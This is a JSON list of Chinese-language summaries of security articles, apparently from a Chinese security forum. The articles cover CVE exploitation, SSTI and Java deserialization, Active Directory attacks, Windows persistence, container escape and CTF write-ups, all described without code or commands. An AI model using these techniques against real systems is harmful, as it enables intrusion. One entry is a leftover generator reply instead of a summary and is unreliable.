        "page_content": "该文档分析了 Apache RocketMQ NameServer 中的远程代码执行漏洞 (CVE-2023-37582)，该漏洞允许攻击者通过更新配置来写入任意文件，从而导致远程代码执行。补丁通过将控制文件路径的属性添加到黑名单来修复此漏洞。",
        "FileName": "12691-Apache RocketMQ NameServer 远程代码执行漏洞（CVE-2023-37582）分析.pdf"
    },
    {
        "page_content": "本文档分析了利用 SQLMAP 通过 UDF 提权获取 MySQL os-shell 的过程。由于 MySQL 服务默认以 mysql 用户权限启动，且 secure_file_priv 参数默认禁用了危险目录的写入，因此需要修改配置或以 root 用户权限启动服务才能成功上传二进制 so 文件并返回 shell。",
        "FileName": "7416-利用SQLMAP获取os-shell的过程分析「UDF提权」.pdf"
    },
    {
        "page_content": "该文档详细介绍了 ZbzCMS 2.1 中发现的多个漏洞，包括存储型 XSS、任意文件删除、任意文件上传、未授权文件上传、未授权 RCE、MySQL 盲注和布尔盲注。这些漏洞允许攻击者执行恶意操作，例如窃取敏感信息、破坏网站或获得对系统的未经授权访问。",
        "FileName": "10557-ZbzCMS 2.1 审计.pdf"
    },
    {
        "page_content": "该文档讨论了在 Android 设备上拦截应用程序消息的困难过程。作者尝试使用 BurpSuite 和 Genymotion 模拟器，但遇到了 SSL 证书和 SSL 双向校验问题。尽管尝试了各种解决方案，包括绕过 SSL 双向校验，但作者仍然无法成功拦截消息。",
        "FileName": "9868-本来就想拦截一下Android app的消息，没想到过程曲折，而且还没成功，希望师傅们指点迷津.pdf"
    },
    {
        "page_content": "该文档分析了 House of Banana 技术，该技术利用 glibc 中的 largebin 攻击来伪造 rtld_global 结构体，从而劫持程序流并执行任意代码。",
        "FileName": "12876-House of banana学习利用.pdf"
    },
    {
        "page_content": "该文档介绍了利用 CVE-2020-8835 漏洞进行提权的三种方法：劫持 vdso、劫持 prctl 和根据 comm 查找 cred 结构。这些方法通过修改内核空间中的数据或函数，最终获得 root 权限。",
        "FileName": "7980-Rick提权CVE-2020-8835下的几种另类提权尝试.pdf"
    },
    {
        "page_content": "本文探讨了攻防演练中的信息收集技巧，重点介绍了使用 Fofa 进行信息收集，包括 Fofa 语法、处理无法打开的资产、识别 CDN 和查找真实 IP。此外，还强调了使用天眼查等企业信息查询工具的重要性，并提供了使用天眼查收集信息的一个示例。",
        "FileName": "8578-浅谈攻防演练中的信息收集.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Node.js 相关知识，包括原型链污染、同步和异步、文件系统模块、子进程模块、原型链和原型链污染。文档还提供了几个示例代码，展示了如何利用原型链污染漏洞来获取 flag。",
        "FileName": "10809-初探node.js相关之原型链污染.pdf"
    },
    {
        "page_content": "该文档介绍了如何复现信呼 OA 存储型 XSS 0day 漏洞，该漏洞存在于信呼 OA v1.9.0~1.9.1 版本中。漏洞利用了登录模块中 addlogs 函数的缺陷，允许攻击者通过修改 X-Forwarded-For 头部来改变后台 IP，从而执行存储型 XSS 攻击。",
        "FileName": "7887-信呼OA存储型XSS 0day复现.pdf"
    },
    {
        "page_content": "该文档重点介绍了利用 Active Directory 证书服务 (ADCS) 中不安全的模板配置来提升域权限的攻击技术。它详细描述了七种不同的错误模板配置，包括 ESC1、ESC2、ESC3、ESC4、ESC6、ESC7 和 ESC8，并提供了针对每种配置的漏洞发现和利用步骤。该文档还提供了利用 ADCS 认证攻击者中继到 AD CS 服务器并获取用户/机器证书的攻击技术。",
        "FileName": "12267-利用ADCS不安全模板配置提升域权限.pdf"
    },
    {
        "page_content": "CVE-2020-10204 漏洞影响 Nexus Repository Manager 3，允许远程代码执行。该漏洞源于 EL 表达式注入限制被绕过，攻击者可以通过修改启动项并注入恶意代码来利用此漏洞。修复版本 Nexus Repository Manager OSS/Pro 3.21.2 通过不解析以 $ 开头的表达式来解决此问题。",
        "FileName": "7559-CVE-2020-10204 Nexus Repository Manager 3-远程执行代码漏洞分析.pdf"
    },
    {
        "page_content": "本文分析了如何绕过网盾 WAF 对 Thymeleaf SSTI 注入漏洞的拦截。通过分析 Thymeleaf SSTI 漏洞底层的 SpEL 表达式注入漏洞，作者发现可以通过修改 SpEL 表达式中的特殊字符编码来绕过网盾 WAF 的拦截，从而成功执行任意命令。",
        "FileName": "11509-记一次实战之若依SSTI注入绕过玄某盾.pdf"
    },
    {
        "page_content": "该文档介绍了基于 Flask 框架的服务器端模板注入 (SSTI) 漏洞，包括其成因、Flask 的基本语法、路由规则、渲染方法和一个 SSTI 示例。漏洞成因在于 render_template_string 函数在渲染模板时使用 %s 动态替换字符串，且 code 参数可控，导致表达式被执行，可进行 XSS 弹窗写入。",
        "FileName": "9026-基于Flask的SSTI入门~.pdf"
    },
    {
        "page_content": "本文档主要介绍了 Flask-jinja2 SSTI 的利⽤姿势，包括 SSTI 的概念、利⽤姿势、绕过技巧和实战案例。文中详细介绍了如何通过 Python 中的类继承关系、过滤器和内置函数来绕过常见的过滤措施，并提供了多个 SSTI 绕过姿势的示例 payload。此外，本文还讨论了在没有回显的情况下如何通过 os.popen 和 curl 将执⾏结果外带出来。",
        "FileName": "9584-以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用.pdf"
    },
    {
        "page_content": "该文档分析了 Jenkins 中的远程代码执行漏洞 (CVE-2018-1000861)，该漏洞利用了 Jenkins 动态路由机制和 Groovy 代码注入的缺陷。通过绕过 ACL 限制和 Groovy 沙箱，攻击者可以实现未经身份验证的 RCE。文档提供了漏洞原理、利用方法和绕过 Groovy 沙箱的技巧，并介绍了 Groovy 语言的基础知识。",
        "FileName": "8231-从Jenkins RCE看Groovy代码注入.pdf"
    },
    {
        "page_content": "这篇文档详细介绍了作者通过一系列技术手段，包括SQL注入、xp_cmdshell、unicode编码和for循环，成功渗透了一个MSSQL网站并获取shell的过程。作者通过创建表存储unicode编码，读取中文字符，最终得到网站绝对路径，并上传免杀aspx马获取shell。",
        "FileName": "11303-一次另类的mssql渗透之路.pdf"
    },
    {
        "page_content": "该文档对 ZTJmessage CMS 进行了代码审计，发现了三个漏洞：后台 SQL 注入、存储型 XSS 和前台 SQL 注入。这些漏洞主要是由于输入过滤不当和富文本编辑器漏洞造成的。文档提供了漏洞分析和利用方法，并强调了代码审计的重要性。",
        "FileName": "11162-关于ZTJmessage cms的代码审计.pdf"
    },
    {
        "page_content": "本文档概述了 Kerberos 域渗透中常见的攻击手法，包括域用户枚举、AS-REP Roasting、密码喷洒、Kerberos 委派攻击、组策略管理密码读取、Golden Ticket 和 Silver Ticket、DCSync、已知漏洞 MS14-068、ZeroLogon、Windows Print Spooler（CVE-2021-1675）和 sAMAccountName spoofing（CVE-2021-42278 和 CVE-2021-42287）。",
        "FileName": "10189-Kerberos域渗透的那些事.pdf"
    },
    {
        "page_content": "本文探讨了在 CTF 竞赛中 XSS 攻击的常见考点，包括利用各种标签和属性绕过限制，以及针对 CSP（内容安全策略）的绕过技术。文章提供了多个实际 CTF 题目示例，展示了如何利用这些考点来成功执行 XSS 攻击。",
        "FileName": "9254-浅谈xss在ctf中的一些考点.pdf"
    },
    {
        "page_content": "该文档介绍了如何在 Burp Suite 中编写插件以自动从 JavaScript 文件中删除 \"use strict\" 字符串，从而绕过前端过滤并访问受保护的函数。它详细介绍了插件开发过程，包括环境配置、接口实现和 HTTP 请求监听，并提供了示例代码。",
        "FileName": "8402-burpsuite 插件编写入门【暴躁脾气】.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 PDFResurrect 0.15 中的栈溢出漏洞 (CVE-2019-14267) 在 PDF 文件中写入恶意 payload 并获得 shell 权限。作者通过禁用优化、绕过 NX 保护、使用 one_gadget 工具查找 ROP 链、修改栈值和利用 libc 中的 gadget，最终成功利用了该漏洞。",
        "FileName": "7684-Rick教你写shellcode系列之邪恶的pdf.pdf"
    },
    {
        "page_content": "该文档记录了一次实战渗透测试的后续过程，渗透者通过利用 MS17010 漏洞和 pass the hash 技术，成功获取了域控权限。渗透者还使用了 mimikatz 工具导出 ntds 数据库，抓取密码，并通过 RDP 访问了域控上的用户会话。",
        "FileName": "9941-记一次实战渗透(下).pdf"
    },
    {
        "page_content": "该文档介绍了绕过正则表达式限制的五种方法，包括异或、或、取反、自增和上传临时文件。这些方法利用了正则表达式中未考虑的字符或操作，从而构造出满足正则表达式条件的输入，绕过限制并执行任意代码。",
        "FileName": "9387-无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）.pdf"
    },
    {
        "page_content": "本文档分析了基于 ThinkPHP 框架的 CTF 题目，介绍了 ThinkPHP 的基本概念、目录结构、命名空间和自动加载机制。它还讨论了路由、隐藏入口文件和强制模式，并提供了利用 ThinkPHP 框架中反序列化漏洞的示例。",
        "FileName": "7685-从0到1对基于thinkphp的相关CTF题目分析.pdf"
    },
    {
        "page_content": "该文档分析了 Java 反序列化中的一个漏洞，该漏洞存在于 Apache Commons-Collections 库中。利用该漏洞，攻击者可以通过构造恶意序列化对象来执行任意代码。文档详细介绍了漏洞的原理、利用链的构造以及如何利用该漏洞执行系统命令。",
        "FileName": "8009-Java反序列化学习之Commons-Collections1.pdf"
    },
    {
        "page_content": "该文档分析了某 OA 后台中的一个 SQL 注入漏洞，该漏洞允许攻击者通过宽字节注入和文件包含来获取 shell。漏洞点位于 getModuleQuickLinkStr() 函数中，该函数将用户提供的 $entity_name 直接拼接在字符串中。攻击者可以通过将宽字节注入到 $entity_name 中来控制 SQL 查询，并利用文件包含来执行任意代码。",
        "FileName": "10286-某OA 后台 Getshell 发现及分析.pdf"
    },
    {
        "page_content": "本文档记录了一次受委托的产品安全测试，重点关注组件漏洞排查、全端口扫描、WEB 目录爆破、WEB 安全内容测试，包括服务端自动填充密码、XSS、命令注入、SQL 注入、SSRF、任意文件上传和命令执行等漏洞的发现和利用过程。",
        "FileName": "8477-记一次受委托的产品安全测试.pdf"
    },
    {
        "page_content": "                    ## 文档\n                    该文档主要对 FastJSON AutoType 的校验原理，以及绕过方法进行简单的分析介绍，跟多的是学习记录，文章涉及的绕过方法都是 \" 站在巨人的肩膀上 \" 看风景的，很后悔当初去看了 Jackson-databind 而丢弃了 fastJSON ，哎 .... ，悔不当初呀 ~",
        "FileName": "9476-某json=1.2.68 Autotype bypass.pdf"
    },
    {
        "page_content": "该文档介绍了 CVE-2020-15257 漏洞，该漏洞影响使用 net=host 参数启动 Docker 容器时与主机共享网络命名空间的容器。攻击者可以通过该漏洞利用容器中暴露的抽象 Unix 套接字来控制下游 runc 进程，从而启动恶意镜像并逃逸容器。文档提供了漏洞原理、POC 代码和利用该漏洞在容器中启动反向 shell 的方法。",
        "FileName": "8681-容器逃逸之 CVE-2020-15257 EXP编写.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2021-3493 漏洞，该漏洞存在于 Linux 内核的 eBPF Verifier 中。该漏洞允许攻击者绕过 eBPF 程序验证，从而执行任意代码。文档概述了漏洞的技术细节，并提供了利用该漏洞进行提权的步骤。",
        "FileName": "11165-eBPF Verifer CVE-2021-3493分析与利用.pdf"
    },
    {
        "page_content": "**主题：** ThinkPHP5.x 远程代码执行 (RCE) 漏洞复现\n\n**内容：** 该文档详细介绍了 ThinkPHP5.x 中的 RCE 漏洞，包括漏洞影响范围、复现环境、漏洞复现步骤、漏洞分析以及利用该漏洞的有效载荷。漏洞的根源在于将控制器名称中的反斜杠 (\\) 开头视为类名，从而允许攻击者实例化任意类并执行任意代码。",
        "FileName": "9361-ThinkPHP5.x RCE 复现.pdf"
    },
    {
        "page_content": "该文档分析了 Yunucms 代码审计中发现的后台 XSS 和数据库信息泄露漏洞。XSS 漏洞允许攻击者在后台系统中注入恶意代码，而数据库泄露漏洞则允许攻击者下载所有数据库备份，从而泄露敏感信息。",
        "FileName": "7178-Yunucms代码审计：后台XSS和数据库信息泄露.pdf"
    },
    {
        "page_content": "该文档介绍了在若依系统中利用 LDAP 协议和 DNS 回显技术执行命令的方法。研究人员发现，虽然常规内存马注入失败，但可以通过 LDAP 协议执行命令。然而，由于该漏洞没有回显，因此无法进行上线或其他操作。为了解决这个问题，研究人员修改了 HexDnsEchoT 工具，通过 DNS 外带命令执行结果，成功获取了命令执行回显，从而获得了目标机器的信息。",
        "FileName": "12352-曲折的命令执行回显.pdf"
    },
    {
        "page_content": "这篇文档深入探讨了 Android 中新版本的 Jemalloc 堆重分配器，该分配器在 Android 10 中引入，并取代了旧版本的 Jemalloc。新版本的 Jemalloc 使用了不同的内部结构，包括 extents 和 arenas，并且在分配策略和内存释放方面与旧版本有显著差异。它还引入了 tcache 机制，用于加速小内存分配。",
        "FileName": "12723-【内存机制分析】探索Android中的新版本Jemalloc堆重分配器.pdf"
    },
    {
        "page_content": "                    好的，我明白了。我将只输出文档的内容，而不包含主题。",
        "FileName": "11159-Ethernaut题解2022版（下）.pdf"
    },
    {
        "page_content": "CVE-2021-3156 漏洞利用 Linux sudo 中的堆溢出，通过设置环境变量 LC_ALL 为一个特定的值，生成一个大堆块，然后通过 get_user_info 函数获取用户信息时，利用堆分配和服务规范初始化，在堆中创建特定大小的空闲块，再通过 malloc() 申请一个堆块，覆盖 service_user 结构中的 compat 指针，指向一个新的 libc，从而执行任意命令获取 root 权限。",
        "FileName": "11115-CVE-2021-3156 Linux sudo 提权利用分析.pdf"
    },
    {
        "page_content": "该文档探讨了如何利用 Nginx 缓存过大请求响应来实现 LFI（本地文件包含）攻击，从而在目标服务器上执行任意代码。攻击者通过上传一个包含恶意代码的 .so 文件，并利用 Nginx 删除临时文件后在 /proc/pid/fd/ 中仍然存在的软链接，绕过 PHP 的包含策略，最终读取到服务器上的 flag 文件。",
        "FileName": "11073-从一道题看LFI与RCE.pdf"
    },
    {
        "page_content": "该文档探讨了蜜罐在网络安全中的作用，重点关注开源蜜罐的类型和功能。它提供了各种蜜罐的比较分析，包括 Web 蜜罐、服务蜜罐和其他蜜罐，并讨论了蜜罐在内网安全中的应用。文档还提供了有关蜜罐部署和管理的实用建议，强调了低交互蜜罐在内网中的适用性。",
        "FileName": "7294-蜜罐调研与内网安全.pdf"
    },
    {
        "page_content": "本文介绍了基于 angr 的漏洞利用自动生成，通过分析程序源代码和示例脚本，展示了漏洞挖掘、可利用状态分析、利用约束设置和约束求解等步骤，并提供了相关接口和示例代码，帮助读者理解 angr 在漏洞利用自动化中的应用。",
        "FileName": "7199-基于 angr 的漏洞利用自动生成之缓冲区溢出案例分析.pdf"
    },
    {
        "page_content": "该文档探讨了利用 ChatGPT 的输出污染来实现 SSTI 注入的可能性。它介绍了一种通过污染 Jinja2 模板引擎的输出，绕过 ChatGPT 的限制并执行任意代码的方法。文档强调了警惕 AIGC 业务中用户可控的输出，并建议将其作为 CTF 题目的有趣思路。",
        "FileName": "12567-ChatGPT安全风险探究——通过污染输出内容达成SSTI注入.pdf"
    },
    {
        "page_content": "该文档分析了 XStream 动态代理反序列化漏洞，该漏洞允许攻击者通过发送恶意 XML payload 来执行任意命令。文档详细介绍了漏洞的利用过程，包括如何生成恶意 payload、如何设置 LDAP 服务以及如何触发漏洞。此外，文档还提供了 POC 代码和调试分析，以帮助读者理解漏洞的原理和利用方法。",
        "FileName": "10001-xstream动态代理反序列化漏洞调试分析.pdf"
    },
    {
        "page_content": "该文档分析了 Apereo Cas 4.1.x 反序列化漏洞，介绍了漏洞利用、回显利用、ysoserial 改造和检测思路。它提供了利用工具和检测方法，并强调了回显在网络受限环境中的重要性。",
        "FileName": "8260-Apereo Cas 4.1.x 反序列化回显与检测.pdf"
    },
    {
        "page_content": "该文档详细描述了作者通过登录目标网站、搜索指纹、尝试弱口令、利用插件漏洞、旁站试错等一系列步骤，最终获得目标网站旁站的shell权限。然而，由于函数禁用和跨目录限制，作者无法直接访问目标网站。作者尝试了各种方法，包括使用哥斯拉绕过执行、反弹shell和提权脚本，但都失败了。",
        "FileName": "9712-一次hvv打点和不断试错.pdf"
    },
    {
        "page_content": "该文档探讨了 OpenWrt 操作系统中的安全问题，包括后端代码中的漏洞、硬编码和后门漏洞。它强调了对 Web 路由、根文件系统和网络端口进行逆向分析的重要性，并提供了 OpenWrt 目录结构和编译过程的概述。",
        "FileName": "10818-Openwrt安全问题思考.pdf"
    },
    {
        "page_content": "该文档分析了强网杯 2020 年 GooExec Chrome pwn 漏洞，该漏洞源于 v8 中的类型转换优化，导致数组类型混淆。文档提供了漏洞的详细分析、利用思路和利用代码，包括通过修改 FLAG_expose_wasm 变量来启用 wasm，以及通过在栈中布置 rop 链和使用 mprotect 函数来利用漏洞。",
        "FileName": "8427-强网杯2020-GooExec chrome pwn分析及两种利用思路.pdf"
    },
    {
        "page_content": "该文档介绍了作者对教育资源挖掘实例的渗透测试过程，重点关注子域扫描、漏洞识别和利用。作者使用 Fofa GUI 工具扫描子域，发现了一个有漏洞的 CMS，并利用 CNVD-2016-08295 漏洞获得了高危权限。此外，作者还使用 Xray 和 Goby 等自动化工具进行静态扫描，发现了 XSS 等中低危漏洞。",
        "FileName": "11071-edusrc 挖掘实例 【实战】 序.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何使用笛卡尔积延时盲注绕过小括号过滤，以获取数据库信息。通过构造没有小括号的查询语句，可以获取列名、表名和数据库内容，从而绕过小括号过滤的限制，成功拿下目标。",
        "FileName": "9494-记录使用笛卡尔积延时盲注绕过小括号过滤.pdf"
    },
    {
        "page_content": "该文档分析了 Internet Explorer 漏洞，重点关注 VBScript 脚本解析引擎。它深入探讨了 VBScript 中的 Variant 数据类型、数组存储结构、函数调用和调试技术，例如 IsEmpty、IsObject、VarType 和 LenB。",
        "FileName": "9278-Internet Explorer漏洞分析(三)[上]——VBScript Scripting Engine初探.pdf"
    },
    {
        "page_content": "**主题：** DolphinPHP RCE 漏洞分析\n\n**内容：** DolphinPHP 中存在一个 RCE 漏洞，攻击者可以通过控制 `action_log` 函数的两个参数来执行任意代码。其中，第一个参数可以通过修改数据库中的 `log` 字段来控制，而第二个参数可以通过上传附件并删除来控制。利用此漏洞，攻击者可以执行任意代码，例如 `calc`。",
        "FileName": "11118-DolphinPHP RCE漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-6418 漏洞，该漏洞是 V8 中的一个类型混淆漏洞，允许攻击者在堆空间内实现任意相对地址读写和任意绝对地址读写。该漏洞是由 JSCreate 节点在进行回调函数时未考虑 side-effect 导致的，在漏洞版本中，V8 认为 JSCreate 节点不会改变当前对象的类型，但在实际中，Reflect.construct 可以通过 Proxy 来触发回调函数来执行任意代码，从而修改对象的类型。利用这个漏洞，攻击者可以通过覆盖数组的 length 字段来实现越界读写，并通过构造 AAR 和 AAW 原语、AddrOf 原语和 FakeObj 原语来找到 wasm 对象的 rwx 内存，写入 shellcode，最后触发函数，执行 shellcode。",
        "FileName": "7314-browser-pwn cve-2020-6418漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了 JDBC MySQL 中的任意文件读取漏洞，该漏洞允许攻击者通过伪造的 MySQL 服务器与客户端通信，从而读取任意文件。文档详细介绍了漏洞的利用场景、通信流程、不同 MySQL 版本之间的差异以及修复方法，并提供了利用该漏洞的示例代码和绕过修复措施的方法。",
        "FileName": "12011-JDBC MySQL任意文件读取分析.pdf"
    },
    {
        "page_content": "本文探讨了 HTML 规范中 marginwidth 和 marginheight 属性的意外行为，这些属性允许在跨域上下文中进行通信。通过利用这些属性，攻击者可以将任意属性值注入嵌套文档的 body 元素，从而绕过跨域限制。该技术在 Safari、Chrome 和 Firefox 等不同浏览器中具有不同的实现方式，但都允许攻击者在不同域之间传递信息。",
        "FileName": "8067-Marginwidthmarginheight – 意想不到的跨源通信通道.pdf"
    },
    {
        "page_content": "本文详细描述了一次成功的网络渗透，从获得初始访问权限到在整个内网进行大规模横向渗透。渗透者通过仔细的信息收集和对开发人员习惯的了解，发现了关键信息，包括数据库地址、密码和网络架构，从而快速识别了目标系统并获得了对大量敏感数据的访问权限。",
        "FileName": "7538-详述一次拿shell后的单机信息搜集和贯穿整个内网的大型横向渗透.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2010-3333 漏洞，该漏洞是一个 Microsoft RTF 栈溢出漏洞。文档详细介绍了漏洞的利用过程，包括使用 msfvenom 生成 shellcode、构造 RTF payload 以及利用 jmp esp 指令执行 shellcode。文档还提供了 Windbg 调试技巧和 Ollydbg 总结，以帮助读者更好地理解漏洞利用过程。",
        "FileName": "7230-漏洞分析学习之cve-2010-3333.pdf"
    },
    {
        "page_content": "该文档介绍了如何实现类似于 Server 酱的微信推送功能，通过调用微信公众号接口，实现模板消息推送。文档详细介绍了配置、数据库设置、编译运行等步骤，并提供了示例代码和配置说明。",
        "FileName": "10496-实现server酱同款微信推送.pdf"
    },
    {
        "page_content": "该文档分析了 Fastjson 反序列化漏洞，该漏洞允许攻击者通过构造恶意 JSON 数据并利用 Fastjson 的 autotype 功能，在反序列化过程中执行远程代码。文档详细介绍了漏洞的原理、利用链和修复建议，并提供了代码示例和调试步骤。",
        "FileName": "9344-Java安全之Fastjson反序列化漏洞分析.pdf"
    },
    {
        "page_content": "Overwolf 1-Click 远程代码执行漏洞（CVE-2021-33501）是由 Overwolf 客户端应用程序中的反射型跨站点脚本（XSS）问题和 Chromium Embedded Framework（CEF）沙箱逃逸相结合造成的，允许未经身份验证的攻击者在运行 Overwolf 客户端应用程序的系统上执行任意命令。",
        "FileName": "9630-Overwolf 1-Click 远程代码执行 - CVE-2021-33501.pdf"
    },
    {
        "page_content": "文档主题是 Breach and Attack Simulation (BAS)，它是一种技术，用于模拟攻击路径和漏洞，以验证安全控制设备的有效性。BAS 可以帮助企业识别网络中的安全漏洞，并确保安全设备能够检测和防御攻击。",
        "FileName": "11880-BAS那点事儿.pdf"
    },
    {
        "page_content": "该文档分析了 D-Link DIR-823G 路由器固件版本 1.02B03 中的命令注入漏洞 (CVE-2019-7298)，该漏洞允许攻击者通过精心设计的 /HNAP1 请求执行任意操作系统命令。漏洞利用了 HNAP API 函数在处理请求时触发对 system 函数的调用，该函数执行了不可信的输入，从而导致命令注入。",
        "FileName": "10936-路由器漏洞分析之 CVE-2019-7298.pdf"
    },
    {
        "page_content": "该文档总结了 Windows 权限维持的各种技术，包括辅助功能镜像劫持、启动项/服务后门、系统计划任务后门、DLL 劫持、Winlogon 用户登录初始化、Logon Scripts、文件关联、Bitsadmin、进程注入、屏幕保护程序、WMI 无文件后门、影子用户等。这些技术允许攻击者在获得对目标系统的初始访问权限后建立持久化后门，从而随时可以重新连接并深入渗透。",
        "FileName": "9718-Windows权限维持总结.pdf"
    },
    {
        "page_content": "该文档讨论了 XML 和 XPath 注入攻击，解释了它们的原理和实现方式。XML 注入攻击利用 XML 解析器解析用户输入的 XML 数据时的安全控制不足，而 XPath 注入攻击利用 XPath 解析器的松散输入和容错特性，允许攻击者通过 XPath 查询代码获取权限信息。文档还提供了两个示例，说明如何利用 XPath 注入攻击绕过登录验证和搜索电影名称。",
        "FileName": "12071-4.bWAPP XML&XPath Injection.pdf"
    },
    {
        "page_content": "该文档介绍了一个使用 Python 脚本监控资产中高危服务的工具，该工具通过 Nmap 扫描资产，解析扫描结果，并通过电子邮件通知管理员新开放的服务。该工具分三个阶段运行，分别针对不同类型的服务进行监控，并休眠 3 小时后进行下一次检测。",
        "FileName": "9156-python脚本监测资产中存在的高危服务.pdf"
    },
    {
        "page_content": "该文档讨论了一个绕过防火墙任意文件下载的技巧，该技巧涉及使用特殊字符序列（如 ../\\/\\/\\）来绕过白名单限制。该技巧允许攻击者从目标服务器读取文件，例如 web.config，从而可能获得敏感信息或进一步利用漏洞。",
        "FileName": "12052-一次玄学的任意文件下载bypass.pdf"
    },
    {
        "page_content": "JEP 290 规范通过在 ObjectInputStream 类中添加一个 serialFilter 属性和一个 filterCheck 函数，为 Java 反序列化提供了一个灵活的机制来限制可以反序列化的类，从而增强了安全性。",
        "FileName": "10170-漫谈 JEP 290.pdf"
    },
    {
        "page_content": "F5 BIG-IP TMUI RCE 漏洞（CVE-2020-5902）允许未经授权的攻击者绕过身份验证，访问 TMUI 模块的所有功能，包括读取/写入任意文件和执行命令，影响范围包括 BIG-IP 11.x 至 15.x 版本，缓解措施包括更新到最新版本、限制分号和 hsqldb 访问，但存在绕过方法。",
        "FileName": "8007-F5 BIG-IP TMUI RCE漏洞（CVE-2020-5902）重现及注意点.pdf"
    },
    {
        "page_content": "这篇文档讲述了作者通过谷歌群组检索和子域名收集，发现了一个目标公司的未授权访问漏洞。作者利用这个漏洞发现了敏感信息，包括用户名、邮箱地址和用户用途描述。随后，作者通过收集到的邮箱地址发现了内部域名，并找到了一个托管 Harbor 的子域。作者尝试通过 CVE-2019-16097 注册管理员账户，但未成功。最终，作者发现了一个未授权访问 Docker 注册表的漏洞，并从镜像中发现了访问密钥和密钥，并向厂商报告了漏洞。",
        "FileName": "7648-记一次从别样的侦察到未授权访问.pdf"
    },
    {
        "page_content": "该文档记录了 0x41414141CTF 网络安全竞赛中的一系列取证和漏洞利用挑战，包括 SQL 注入、SSRF、XXE、命令执行和文件探测，展示了各种技术和解决方法。",
        "FileName": "9188-0x41414141CTF web&一道forensics writeups.pdf"
    },
    {
        "page_content": "该文档分析了 Hitcon Training Lab10 中的 UAF（使用后释放）漏洞，该漏洞允许攻击者在释放内存后再次使用它，从而导致程序崩溃或执行任意代码。文档详细介绍了漏洞的原理、利用方法和解决步骤，包括静态审计源码、构造思路、动态调试找地址和编写 exp。",
        "FileName": "7146-Hitcon Traning Lab10做题笔记 —— UAF漏洞分析.pdf"
    },
    {
        "page_content": "该文档详细分析了 VMware vCenter 中的远程代码执行 (RCE) 漏洞 (CVE-2021-21972)，该漏洞允许未经授权的客户端通过上传恶意 .tar 存档来在目标服务器上执行任意命令。该漏洞影响 Windows 和 Linux 系统，可以通过上传 .jsp shell 或 SSH 公钥来实现 RCE。强烈建议更新到最新版本的 VMware vSphere Client 以修复此漏洞。",
        "FileName": "9243-深入分析VMware vCenter远程代码执行漏洞.pdf"
    },
    {
        "page_content": "该文档分析了某 PHP 商城系统的安全审计，发现了几个漏洞，包括文件上传漏洞、任意文件删除漏洞和逻辑漏洞。这些漏洞允许攻击者上传恶意文件、删除任意文件以及导致系统报错。文档还提供了漏洞的详细分析和利用方法，并建议采取措施修复这些漏洞。",
        "FileName": "10950-某php商城系统简单的审计.pdf"
    },
    {
        "page_content": "该文档介绍了 As-Exploits，一个用于中国蚁剑后渗透框架的插件框架。它提供了模块化和可扩展的架构，允许用户快速开发和集成自定义后渗透模块，从而增强蚁剑的功能。该框架专注于与其他工具（如 MSF、nmap）的集成，并提供了一系列功能，包括内存 Webshell 注入、杀软识别、字节码修改和表单生成。",
        "FileName": "8591-As-Exploits 中国蚁剑后渗透框架.pdf"
    },
    {
        "page_content": "该文档介绍了在渗透测试中利用远控软件（如向日葵、TeamViewer、toDesk、AnyDesk）远程连接服务器的方法。通过获取服务器进程信息，查看远控软件安装目录和配置文件，可以获取客户端ID和连接密码，从而实现远程连接。文档还提供了在服务器未安装远控软件时，通过上传安装包并静默安装的方式进行远程连接的步骤。",
        "FileName": "12745-远控软件在渗透中利用.pdf"
    },
    {
        "page_content": "本文探讨了Mimikatz工具中“sekurlsa::wdigest”功能的工作原理，该功能用于从Windows系统中的lsass进程中提取明文凭据。文章详细分析了Mimikatz如何识别和解密WDigest缓存的凭据，并提供了如何使用Mimikatz之外的工具来实现类似功能的示例。此外，文章还介绍了如何通过修改注册表项或使用RPC调用来将任意DLL加载到lsass进程中，为特权妥协技术提供了潜在的利用方式。",
        "FileName": "8268-探索Mimikatz-第1部分-WDigest.pdf"
    },
    {
        "page_content": "该文档探讨了 Flask 中服务器端模板注入 (SSTI) 绕过的原理，分析了 Python 如何编译代码并生成对象，以及如何利用这些对象绕过限制。它提供了利用内置函数、类和特殊方法来执行代码的具体示例，并讨论了过滤绕过技术，例如使用反转、拼接和利用请求参数。",
        "FileName": "8029-浅谈flask ssti 绕过原理.pdf"
    },
    {
        "page_content": "本文分析了经典的 CC1、CC6 和 CC3 三条反序列化漏洞链，并通过组合这些链，得到了 6 种不同的漏洞利用链。这些链利用了 Java 标准集合框架 commons-collections 中的漏洞，通过触发不同类中同名方法，最终达到任意代码执行的目的。文中详细介绍了漏洞挖掘思路、链条构造过程和修复方法，并提供了完整的代码示例。",
        "FileName": "12395-学习Commons Collections 的挖掘思路.pdf"
    }
]